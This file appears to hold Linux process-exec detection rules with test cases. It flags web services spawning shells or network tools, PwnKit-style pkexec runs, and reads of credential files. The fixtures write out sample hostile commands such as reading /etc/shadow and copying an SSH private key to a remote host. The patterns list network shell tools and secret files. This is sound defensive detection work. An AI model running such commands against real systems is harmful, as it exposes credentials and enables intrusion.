# Linux exec rules (producer: internal/collect/audit process_start). Fields:
# comm, cmdline, image (= exe), argc, uid, cgroup, parent.{exe,comm,cmdline}.
# Exec rules take the plan tag exemption so our own hardening (chattr +i,
# useradd, auditctl, iptables) is silent; an operator typing the same command
# costs one click at tier 1.
id: D1.service-spawns-shell
title: Scored service process spawned a shell or tool outside its learned children
severity: high
tier: 1
attack: [T1505.003, T1059]
collect: [process_tree, content_changes, transactions_window_10m, freeze_ring]
ir_template: web-app-compromise
exempt_tagged: true
entities: [parent.comm, image]
message: "{parent.comm} spawned {image}: {cmdline}"
when:
  event: process_start
  all:
    - parent.comm: {in_profile: scored.service_comms}
    - not: {image: {in_profile: svc.children}}
    - image: {endswith_any: [/sh, /bash, /dash, /zsh, /ash, /busybox, /python3, /python, /perl, /nc, /ncat, /socat, /curl, /wget]}
tests:
  - name: shell under a scored service
    should_match: true
    seed: {scored.service_comms: [apache2], svc.children: {apache2: [/usr/bin/convert]}}
    event: {kind: process_start, fields: {image: /bin/sh, cmdline: "sh -c id", parent: {comm: apache2}}}
  - name: parent flat field from the exec feed
    should_match: true
    seed: {scored.service_comms: [apache2], svc.children: {apache2: [/usr/bin/convert]}}
    event: {kind: process_start, fields: {exe: /usr/bin/python3, pcomm: apache2}}
  - name: parent is not a scored service
    should_match: false
    seed: {scored.service_comms: [apache2]}
    event: {kind: process_start, fields: {image: /bin/bash, parent: {comm: sshd}}}
  - name: tagged plan step
    should_match: false
    seed: {scored.service_comms: [apache2], svc.children: {apache2: [/usr/bin/convert]}}
    event: {kind: process_start, fields: {image: /bin/sh, parent: {comm: apache2}, tag: "plan:p9"}}
---
id: D3e.pwnkit-exec
title: pkexec executed with no arguments by a non-root user
severity: critical
tier: 1
attack: [T1068]
collect: [process_tree]
when:
  event: process_start
  all:
    - comm: pkexec
    - uid: {gt: 0}
    - argc: 0
tests:
  - {name: pwnkit shape, should_match: true, event: {kind: process_start, fields: {comm: pkexec, uid: 1000, argc: 0, cmdline: ""}}}
  - {name: normal pkexec, should_match: false, event: {kind: process_start, fields: {comm: pkexec, uid: 1000, argc: 2, cmdline: "pkexec ls"}}}
  - {name: root, should_match: false, event: {kind: process_start, fields: {comm: pkexec, uid: 0, argc: 0}}}
---
id: D15b.cred-file-access
title: Credential-harvesting command against a well-known secret file
severity: medium
tier: 1
attack: [T1552.001, T1552.004]
collect: [process_tree]
exempt_tagged: true
when:
  event: process_start
  all:
    - comm: [cat, less, more, head, tail, grep, egrep, fgrep, strings, cp, scp, tar, zip, base64, xxd, find, locate]
    - cmdline: {re: '(?i)(id_(rsa|dsa|ecdsa|ed25519)|\.kdbx|passlist|cc_data|wp-config|\.pgpass|\.my\.cnf|\.git-credentials|\.aws/credentials|/etc/shadow|\.env(\s|$))'}
tests:
  - {name: cat shadow, should_match: true, event: {kind: process_start, fields: {comm: cat, cmdline: "cat /etc/shadow"}}}
  - {name: scp private key, should_match: true, event: {kind: process_start, fields: {comm: scp, cmdline: "scp /root/.ssh/id_rsa x@y:"}}}
  - {name: ssh -i is not a read, should_match: false, event: {kind: process_start, fields: {comm: ssh, cmdline: "ssh -i /root/.ssh/id_rsa x@y"}}}
  - {name: cat of a log, should_match: false, event: {kind: process_start, fields: {comm: cat, cmdline: "cat /var/log/syslog"}}}
